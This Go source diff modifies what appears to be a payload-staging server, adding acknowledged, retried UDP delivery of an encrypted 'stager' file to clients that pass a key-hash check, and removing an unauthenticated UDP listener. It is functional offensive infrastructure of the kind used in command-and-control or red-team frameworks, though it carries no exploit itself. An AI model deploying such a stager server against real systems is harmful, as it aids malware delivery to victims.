@@ -6,6 +6,13 @@ import (
 	"log"
 	"net"
 	"os"
+	"sync"
+	"time"
+)
+
+var (
+	udpSessions      = make(map[string]chan uint32)
+	udpSessionsMutex sync.Mutex
 )
 
 // TCPAESCompressedListener serves the encrypted stager file over raw TCP.
@@ -128,7 +135,7 @@ func UDPAESCompressedListener(stagerPath string, port string, keyStr string, com
 		keyHash ^= uint32(key[i]) << ((i % 4) * 8)
 	}
 
-	buffer := make([]byte, 1024)
+	buffer := make([]byte, 2048) // Buffer for incoming packets
 	for {
 		n, remoteAddr, err := conn.ReadFromUDP(buffer)
 		if err != nil {
@@ -136,81 +143,121 @@ func UDPAESCompressedListener(stagerPath string, port string, keyStr string, com
 			continue
 		}
 
-		// Verify authentication (key hash)
-		if n == 4 {
-			receivedHash := binary.LittleEndian.Uint32(buffer[:4])
+		if n < 5 {
+			continue
+		}
+
+		packetType := buffer[0]
+		payload := buffer[1:n]
+
+		if packetType == 0x02 { // Hello
+			if len(payload) < 4 {
+				continue
+			}
+			receivedHash := binary.LittleEndian.Uint32(payload[:4])
 			if receivedHash == keyHash {
 				log.Printf("Authenticated request from %s", remoteAddr)
-				go handleUDPConnection(conn, remoteAddr, encryptedStager)
+
+				udpSessionsMutex.Lock()
+				if _, exists := udpSessions[remoteAddr.String()]; !exists {
+					ackChan := make(chan uint32, 10)
+					udpSessions[remoteAddr.String()] = ackChan
+					go handleUDPConnection(conn, remoteAddr, encryptedStager, ackChan)
+				}
+				udpSessionsMutex.Unlock()
 			} else {
 				log.Printf("Authentication failed from %s (hash mismatch)", remoteAddr)
 			}
+		} else if packetType == 0x01 { // ACK
+			if len(payload) < 4 {
+				continue
+			}
+			seq := binary.LittleEndian.Uint32(payload[:4])
+
+			udpSessionsMutex.Lock()
+			if ch, exists := udpSessions[remoteAddr.String()]; exists {
+				select {
+				case ch <- seq:
+				default:
+				}
+			}
+			udpSessionsMutex.Unlock()
 		}
 	}
 }
 
-func handleUDPConnection(conn *net.UDPConn, addr *net.UDPAddr, data []byte) {
-	const chunkSize = 1024
-	offset := 0
+func handleUDPConnection(conn *net.UDPConn, addr *net.UDPAddr, data []byte, ackChan chan uint32) {
+	defer func() {
+		udpSessionsMutex.Lock()
+		delete(udpSessions, addr.String())
+		udpSessionsMutex.Unlock()
+		close(ackChan)
+	}()
 
-	for offset < len(data) {
-		end := offset + chunkSize
+	const chunkSize = 1024
+	const headerSize = 5 // Type(1) + Seq(4)
+
+	totalPackets := (len(data) + chunkSize - 1) / chunkSize
+
+	for i := 0; i < totalPackets; i++ {
+		start := i * chunkSize
+		end := start + chunkSize
 		if end > len(data) {
 			end = len(data)
 		}
 
-		_, err := conn.WriteToUDP(data[offset:end], addr)
-		if err != nil {
-			log.Printf("Failed to send UDP chunk to %s: %v", addr, err)
-			return
+		chunk := data[start:end]
+		packet := make([]byte, headerSize+len(chunk))
+		packet[0] = 0x00 // Data type
+		binary.LittleEndian.PutUint32(packet[1:5], uint32(i))
+		copy(packet[5:], chunk)
+
+		// Send with retry
+		maxRetries := 10
+		retryCount := 0
+
+		for retryCount < maxRetries {
+			_, err := conn.WriteToUDP(packet, addr)
+			if err != nil {
+				log.Printf("Failed to send UDP chunk to %s: %v", addr, err)
+				return
+			}
+
+			// Wait for ACK
+			timeout := time.NewTimer(500 * time.Millisecond)
+			select {
+			case ackSeq := <-ackChan:
+				if ackSeq == uint32(i) {
+					timeout.Stop()
+					goto NextPacket
+				}
+				// Ignore old ACKs
+			case <-timeout.C:
+				retryCount++
+			}
 		}
-
-		offset = end
-	}
-
-	// Send end marker (4 zero bytes)
-	endMarker := make([]byte, 4)
-	_, err := conn.WriteToUDP(endMarker, addr)
-	if err != nil {
-		log.Printf("Failed to send end marker to %s: %v", addr, err)
+		log.Printf("Max retries reached for packet %d to %s", i, addr)
 		return
+
+	NextPacket:
 	}
 
-	log.Printf("Sent %d bytes to %s", len(data), addr)
-}
+	// Send end marker (Data packet with empty payload)
+	endPacket := make([]byte, headerSize)
+	endPacket[0] = 0x00
+	binary.LittleEndian.PutUint32(endPacket[1:5], uint32(totalPackets))
 
-// UDPBareListener serves the stager file over UDP without encryption or compression.
-func UDPBareListener(stagerPath string, port string) error {
-	stager, err := os.ReadFile(stagerPath)
-	if err != nil {
-		return fmt.Errorf("failed to read stager file: %v", err)
-	}
-
-	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf(":%s", port))
-	if err != nil {
-		return fmt.Errorf("failed to resolve UDP address: %v", err)
-	}
-
-	conn, err := net.ListenUDP("udp", addr)
-	if err != nil {
-		return fmt.Errorf("failed to start UDP listener: %v", err)
-	}
-	defer conn.Close()
-
-	log.Printf("UDP listener (bare) started on port %s", port)
-
-	buffer := make([]byte, 1024)
-	for {
-		n, remoteAddr, err := conn.ReadFromUDP(buffer)
-		if err != nil {
-			log.Printf("Failed to read from UDP: %v", err)
-			continue
-		}
-
-		// Any request triggers sending the stager
-		if n > 0 {
-			log.Printf("Request from %s", remoteAddr)
-			go handleUDPConnection(conn, remoteAddr, stager)
+	for i := 0; i < 5; i++ {
+		conn.WriteToUDP(endPacket, addr)
+		timeout := time.NewTimer(500 * time.Millisecond)
+		select {
+		case ackSeq := <-ackChan:
+			if ackSeq == uint32(totalPackets) {
+				timeout.Stop()
+				log.Printf("Sent %d bytes to %s (Completed)", len(data), addr)
+				return
+			}
+		case <-timeout.C:
 		}
 	}
 }
